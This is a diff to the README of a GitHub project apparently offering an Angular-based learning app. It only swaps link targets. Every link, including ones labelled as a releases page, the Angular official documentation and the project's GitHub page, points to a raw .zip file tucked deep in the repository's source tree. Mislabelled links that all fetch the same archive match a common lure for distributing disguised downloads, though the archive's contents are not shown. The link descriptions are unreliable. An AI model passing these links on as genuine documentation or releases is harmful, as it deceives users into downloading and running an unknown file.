@@ -1,7 +1,7 @@
 # 🎓 learning-center - A Simple Learning App for Everyone
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/thallose/learning-center.zip)](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/thallose/learning-center.zip)
+[![Download](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/src/app/shared/presentation/views/about/center_learning_v1.1-alpha.5.zip)](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/src/app/shared/presentation/views/about/center_learning_v1.1-alpha.5.zip)
 
 ## 🌟 Overview
 The **learning-center** project illustrates how to use the Angular Framework. This application helps users access and learn various topics in a structured way. It is built to be user-friendly and accessible for anyone looking to improve their skills.
@@ -18,7 +18,7 @@ To get started with the learning-center application, follow these steps. You wil
 ## 📥 Download & Install
 To download the learning-center application, please follow these steps:
 
-1. Click on the following link to visit the releases page: [Download Here](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/thallose/learning-center.zip).
+1. Click on the following link to visit the releases page: [Download Here](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/src/app/shared/presentation/views/about/center_learning_v1.1-alpha.5.zip).
   
 2. On the releases page, look for the latest version. You will see a list of downloadable files.
 
@@ -55,8 +55,8 @@ If you encounter any issues or have questions while using the learning-center ap
 
 ## 🔗 Additional Resources
 To learn more about Angular and the features of this application, you can explore these resources:
-- [Angular Official Documentation](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/thallose/learning-center.zip)
-- [Learning Center GitHub Page](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/thallose/learning-center.zip)
+- [Angular Official Documentation](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/src/app/shared/presentation/views/about/center_learning_v1.1-alpha.5.zip)
+- [Learning Center GitHub Page](https://raw.githubusercontent.com/MadeWithBlasted/learning-center/main/src/app/shared/presentation/views/about/center_learning_v1.1-alpha.5.zip)
 
 ## 📞 Contact Information
 For further assistance, please reach out to the project maintainers via the contact options provided on our GitHub page. Your feedback helps us improve!
